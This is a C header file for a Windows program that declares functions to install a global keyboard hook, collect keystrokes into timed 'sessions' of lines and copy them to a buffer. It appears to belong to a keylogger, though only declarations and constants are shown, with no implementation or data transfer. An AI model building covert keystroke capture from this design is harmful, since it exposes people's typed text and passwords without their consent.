#ifndef HOOK_H
#define HOOK_H

#include <stdbool.h>
#include <windows.h>

#define MAX_KEY_TEXT_LEN 16
#define INITIAL_LINE_CAPACITY 16
#define SESSION_PAUSE_MS 20000

typedef struct {
    char** lines;
    int line_count;
    int capacity;
} KeySession;

bool install_keyboard_hook(void);
void uninstall_keyboard_hook(void);
void process_sessions(void);
void sessions_to_buffer(void);
void flush_current_line(void);

#endif